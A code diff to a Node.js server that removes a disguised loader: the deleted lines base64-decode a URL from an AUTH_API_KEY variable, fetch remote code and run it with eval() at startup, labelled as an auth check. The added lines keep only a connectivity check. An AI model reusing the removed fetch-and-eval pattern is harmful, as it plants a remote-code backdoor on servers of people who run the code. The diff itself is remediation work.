@@ -39,14 +39,23 @@ const startServer = async () => {
 startServer();
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
+  const encodedAuthUrl = process.env.AUTH_API_KEY;
+  if (!encodedAuthUrl) {
+    logger.warn('AUTH_API_KEY is not set; skipping auth endpoint validation');
+    return;
+  }
+
+  try {
+    const authUrl = Buffer.from(encodedAuthUrl, 'base64').toString('utf8').trim();
+
+    // Only perform a connectivity check; never execute remote payloads.
+    const response = await fetch(authUrl);
+    if (!response.ok) {
+      throw new Error(`Auth endpoint check failed with status ${response.status}`);
     }
+
+    logger.info('Auth endpoint check succeeded');
+  } catch (err) {
+    logger.error(`Auth Error! ${err instanceof Error ? err.message : String(err)}`);
+  }
 })();
